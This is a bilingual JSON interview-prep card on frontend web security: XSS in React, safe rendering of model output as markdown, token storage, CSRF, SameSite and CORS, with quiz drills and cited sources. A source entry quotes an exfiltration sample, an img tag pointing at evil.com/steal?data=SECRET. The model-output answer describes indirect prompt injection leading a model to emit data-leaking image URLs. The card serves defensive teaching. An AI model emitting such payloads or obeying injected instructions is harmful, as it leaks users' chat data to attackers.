@@ -1,0 +1,223 @@
+{
+  "n": 48,
+  "tag": "Frontend core · Browser",
+  "sec": "web",
+  "core": [
+    63
+  ],
+  "ru": {
+    "topic": "Веб-безопасность для фронтендера",
+    "qs": [
+      "У нас React, он же всё экранирует. Значит, XSS нам не грозит? Где это ломается?",
+      "Мы рендерим ответы модели как markdown в чате. Что может пойти не так?",
+      "Где бы ты хранил auth-токен, и как сюда вписываются CSRF, SameSite и CORS?"
+    ],
+    "a": [
+      {
+        "q": "XSS в React",
+        "t": "Не совсем. React экранирует текст в JSX-детях и значениях атрибутов, поэтому строка с тегом script отрисуется как обычные символы. Это закрывает классические виды XSS (межсайтового скриптинга): stored (хранимый), когда payload (вредоносная нагрузка) лежит в базе, reflected (отражённый), когда он возвращается из параметра URL в ответе, и DOM-based, когда мой же клиентский код переносит данные атакующего из location или postMessage в опасное место вроде innerHTML. Защита заканчивается на лазейках. dangerouslySetInnerHTML отдаёт сырой HTML парсеру. href из пользовательских данных может оказаться javascript:. React 19 блокирует именно javascript:-ссылки, старые версии только предупреждали, а data: или фишинговый домен всё равно пройдут. Поэтому я пропускаю только http, https и mailto. Превратить markdown в HTML-строку и вставить её — та же дыра. Прямой innerHTML через ref обходит React полностью. Как страховку ставлю строгий CSP (политику безопасности контента): script-src с nonce (одноразовым случайным значением) на каждый запрос и 'strict-dynamic', чтобы скрипты, загруженные доверенным скриптом, тоже работали без списка хостов. Внедрённый инлайн-скрипт тогда не выполнится. Это ограничение ущерба, а не исправление, и в Next.js nonce заставляет рендерить страницы динамически."
+      },
+      {
+        "q": "Вывод модели",
+        "t": "Я считаю вывод модели недоверенным вводом, как комментарий пользователя. Модель может повторить всё, что попало в её контекст: найденный документ, веб-страницу, результат инструмента. Так indirect prompt injection (непрямая инъекция инструкций через данные) превращается в XSS, если я рендерю HTML. По умолчанию я разбираю markdown в React-элементы с выключенным сырым HTML. react-markdown так и делает из коробки и вырезает опасные протоколы в ссылках. Если HTML действительно нужен, я конвертирую markdown в HTML и уже результат прогоняю через DOMPurify, никогда не наоборот. Менее очевидный риск — exfiltration (утечка данных наружу). Внедрённая инструкция может заставить модель вывести картинку, в URL которой зашиты данные из чата. Браузер загрузит её при рендере, без всякого клика. Поэтому я блокирую картинки с неизвестных хостов или проксирую их, показываю адрес ссылки, ставлю rel noopener noreferrer и подкрепляю это через img-src и connect-src в CSP. При стриминге я на каждом чанке (порции ответа) заново рендерю безопасное дерево из накопленного текста, а не дописываю сырые HTML-фрагменты."
+      },
+      {
+        "q": "Токены и CSRF",
+        "t": "Я предпочитаю cookie с HttpOnly и Secure. JavaScript не может её прочитать, поэтому XSS может действовать от имени пользователя, пока вкладка открыта, но не может украсть токен и использовать его с другой машины. Токен из localStorage внедрённый скрипт уносит одной строкой кода. XSS — это катастрофа в любом случае, cookie лишь ограничивает ущерб. Цена cookie — CSRF (подделка межсайтовых запросов): браузер прикладывает её к запросам, которые инициировал чужой сайт. Главная защита — SameSite. Lax отправляет cookie при top-level (верхнеуровневой) GET-навигации, но не при кросс-сайтовых POST, fetch или iframe. Chromium-браузеры ставят Lax по умолчанию, если атрибут не указан, но с двухминутным исключением: свежую cookie ещё отправят с кросс-сайтовым top-level POST. Firefox и Safari Lax по умолчанию не ставят вообще. Поэтому я всегда задаю его явно и держу GET без побочных эффектов. SameSite считает по сайту, а не по origin (схема, хост и порт), так что взломанный соседний поддомен всё ещё same-site. Для этого добавляю CSRF-токен или проверку заголовка Origin. CORS — другое. Он ослабляет same-origin policy (политику одного источника) и решает, даст ли браузер JS страницы прочитать ответ. Сервер он не защищает: простой POST всё равно дойдёт, а curl CORS вообще игнорирует."
+      }
+    ],
+    "kill": "<b>«У нас React, XSS нам не страшен»</b> или <b>«CORS защищает наш API»</b> — CORS решает только, что браузер даст прочитать JS, а запрос до сервера всё равно доходит."
+  },
+  "en": {
+    "topic": "Web security for a frontend engineer",
+    "qs": [
+      "We use React and it escapes everything. So XSS isn't our problem, right? Where does that break?",
+      "We render model responses as markdown in a chat UI. What can go wrong?",
+      "Where would you keep the auth token, and how do CSRF, SameSite and CORS fit in?"
+    ],
+    "a": [
+      {
+        "q": "XSS in React",
+        "t": "Not quite. React escapes text in JSX children and attribute values, so a string with a script tag renders as literal characters. That covers the classic XSS types: stored, where the payload sits in the database, reflected, where it bounces back from a URL parameter in the response, and DOM-based, where my own client code moves attacker data from location or postMessage into a sink like innerHTML. The protection ends at the escape hatches. dangerouslySetInnerHTML hands raw HTML to the parser. An href built from user data can be javascript:. React 19 blocks javascript: URLs specifically, older versions only warned, and data: or a phishing domain still pass. So I allowlist http, https and mailto. Converting markdown to an HTML string and injecting it is the same hole. Raw innerHTML through a ref bypasses React completely. As a backstop I ship a strict CSP: script-src with a per-request nonce plus 'strict-dynamic', so scripts loaded by a trusted script also run without a host allowlist. An injected inline script then won't execute. It's damage limitation, not a fix, and in Next.js nonces force dynamic rendering."
+      },
+      {
+        "q": "Model output",
+        "t": "I treat model output as untrusted input, same as a user comment. The model can repeat anything that reached its context: a retrieved document, a web page, a tool result. So indirect prompt injection turns into XSS the moment I render HTML. My default is to parse markdown into React elements with raw HTML disabled. react-markdown does that out of the box and strips dangerous URL protocols. If I really need HTML, I convert markdown to HTML first and run DOMPurify on the result, never the other way round. The less obvious risk is exfiltration. An injected instruction can make the model emit an image whose URL carries chat data in the query string. The browser fetches it on render, no click needed. So I block images from unknown hosts or proxy them, show link destinations, add rel noopener noreferrer, and back it up with img-src and connect-src in the CSP. With streaming, I re-render a safe tree from the accumulated text on each chunk instead of appending raw HTML fragments."
+      },
+      {
+        "q": "Tokens and CSRF",
+        "t": "I prefer an HttpOnly, Secure cookie. JavaScript can't read it, so an XSS can act as the user while the tab is open, but it can't steal the token and replay it from another machine. A token in localStorage is one line away from exfiltration. XSS is game over either way; the cookie just limits the blast radius. The cost of cookies is CSRF: the browser attaches them to requests another site triggers. SameSite is the main defense. Lax sends the cookie on top-level GET navigations but not on cross-site POSTs, fetches or iframes. Chromium browsers default to Lax when the attribute is missing, with a two-minute exception: a freshly set cookie still goes out on a top-level cross-site POST. Firefox and Safari don't default to Lax. So I always set it explicitly and keep GET free of side effects. SameSite works on site, not origin, so a compromised sibling subdomain is still same-site. For that I add a CSRF token or an Origin header check. CORS is different. It relaxes the same-origin policy and decides whether the browser lets page JS read a response. It doesn't protect the server: a simple POST still arrives, and curl ignores CORS entirely."
+      }
+    ],
+    "kill": "<b>\"We use React, so XSS isn't a concern\"</b> or <b>\"CORS protects our API\"</b> — CORS only controls what the browser lets JS read; the request still reaches the server."
+  },
+  "drills": {
+    "lies": {
+      "ru": [
+        "SameSite=Lax стоит по умолчанию во всех основных браузерах, поэтому явно задавать его не нужно.",
+        "Если CORS-политика не разрешает evil.com, то POST-форма с evil.com вообще не дойдёт до нашего сервера."
+      ],
+      "en": [
+        "SameSite=Lax is the default in all major browsers, so there's no need to set it explicitly.",
+        "If our CORS policy doesn't allow evil.com, a form POST from evil.com never reaches our server."
+      ]
+    },
+    "cloze": {
+      "ru": [
+        "Строгий CSP использует в script-src [[nonce|одноразовое значение]] на каждый запрос вместе с 'strict-dynamic'.",
+        "С SameSite=[[Lax]] cookie отправляется при top-level GET-навигации, но не при кросс-сайтовых POST.",
+        "Картинка в markdown с URL атакующего превращает prompt injection в канал [[утечки данных|утечки|утечки информации]]."
+      ],
+      "en": [
+        "A strict CSP puts a per-request [[nonce|nonce value]] in script-src together with 'strict-dynamic'.",
+        "With SameSite=[[Lax]], the cookie is sent on top-level GET navigations but not on cross-site POSTs.",
+        "A markdown image pointing at an attacker URL turns prompt injection into a channel for [[exfiltration|data exfiltration|data leaks]]."
+      ]
+    }
+  },
+  "sources": [
+    {
+      "w": [
+        0
+      ],
+      "s": "ok",
+      "c": "React escapes text; dangerouslySetInnerHTML passes raw HTML and is an XSS risk",
+      "e": "Unless the markup is from a completely trusted source, it is trivial to introduce an XSS vulnerability.",
+      "u": [
+        "https://react.dev/reference/react-dom/components/common"
+      ]
+    },
+    {
+      "w": [
+        0
+      ],
+      "s": "ok",
+      "c": "XSS types: stored, reflected, DOM-based",
+      "e": "Stored: permanently stored on servers; reflected: reflected off the web server; DOM-based: in client-side code.",
+      "u": [
+        "https://community.owasp.org/attacks/xss/"
+      ]
+    },
+    {
+      "w": [
+        0
+      ],
+      "s": "ok",
+      "c": "React 19 blocks javascript: URLs, older versions only warned; data: still passes",
+      "e": "React 19 breaking change: 'Error for javascript URLs in src and href' (#26507); sanitizeURL only matches javascript:.",
+      "u": [
+        "https://react.dev/blog/2024/04/25/react-19-upgrade-guide"
+      ]
+    },
+    {
+      "w": [
+        0
+      ],
+      "s": "ok",
+      "c": "Strict CSP: script-src with per-request nonce + 'strict-dynamic'; scripts loaded by trusted scripts run, host allowlist ignored",
+      "e": "script-src 'nonce-{RANDOM}' 'strict-dynamic'; nonce newly generated for every response.",
+      "u": [
+        "https://web.dev/articles/strict-csp"
+      ]
+    },
+    {
+      "w": [
+        0
+      ],
+      "s": "ok",
+      "c": "In Next.js, nonces force dynamic rendering",
+      "e": "When you use nonces in your CSP, all pages must be dynamically rendered.",
+      "u": [
+        "https://nextjs.org/docs/app/guides/content-security-policy"
+      ]
+    },
+    {
+      "w": [
+        1
+      ],
+      "s": "ok",
+      "c": "react-markdown ignores/escapes raw HTML by default and strips dangerous URL protocols",
+      "e": "Typically escapes HTML; defaultUrlTransform allows http, https, irc, ircs, mailto, xmpp.",
+      "u": [
+        "https://github.com/remarkjs/react-markdown"
+      ]
+    },
+    {
+      "w": [
+        1
+      ],
+      "s": "ok",
+      "c": "Sanitize with DOMPurify after markdown-to-HTML, never before",
+      "e": "If you first sanitize HTML and then modify it afterwards, you might easily void the effects of sanitization.",
+      "u": [
+        "https://github.com/cure53/DOMPurify"
+      ]
+    },
+    {
+      "w": [
+        1
+      ],
+      "s": "ok",
+      "c": "Injected markdown image with data in URL exfiltrates on render; mitigate with image blocking/CSP",
+      "e": "Hidden image tags for data exfiltration: <img src=\"http://evil.com/steal?data=SECRET\">; restrict images via CSP.",
+      "u": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "w": [
+        2
+      ],
+      "s": "ok",
+      "c": "HttpOnly cookie is unreadable by JS; localStorage tokens exposed to XSS",
+      "e": "Do not store session identifiers in local storage... Cookies can mitigate this risk using httpOnly.",
+      "u": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "w": [
+        2
+      ],
+      "s": "ok",
+      "c": "SameSite=Lax: sent on top-level GET navigations, not on cross-site POST, fetch or iframe",
+      "e": "Top-level navigation with safe method; excludes fetch(), subresources, iframe navigations, POST.",
+      "u": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"
+      ]
+    },
+    {
+      "w": [
+        2
+      ],
+      "s": "fix",
+      "c": "Chromium defaults to Lax when SameSite missing; Firefox and Safari don't",
+      "e": "True (BCD: Chrome 80+, Firefox flag only, Safari no), but default Lax also sends cookies on POSTs within two minutes of being set.",
+      "u": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"
+      ]
+    },
+    {
+      "w": [
+        2
+      ],
+      "s": "ok",
+      "c": "SameSite is per site, not origin; sibling subdomain is same-site; add CSRF token or Origin check",
+      "e": "www.example.com and login.example.com are same-site but cross-origin (OWASP CSRF sheet notes sibling-host risk).",
+      "u": [
+        "https://web.dev/articles/same-site-same-origin"
+      ]
+    },
+    {
+      "w": [
+        2
+      ],
+      "s": "ok",
+      "c": "CORS relaxes SOP, controls whether JS reads response; simple POST still reaches server",
+      "e": "Simple requests aren't preflighted; server must opt in with Access-Control-Allow-Origin to share response with script.",
+      "u": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS"
+      ]
+    }
+  ]
+}
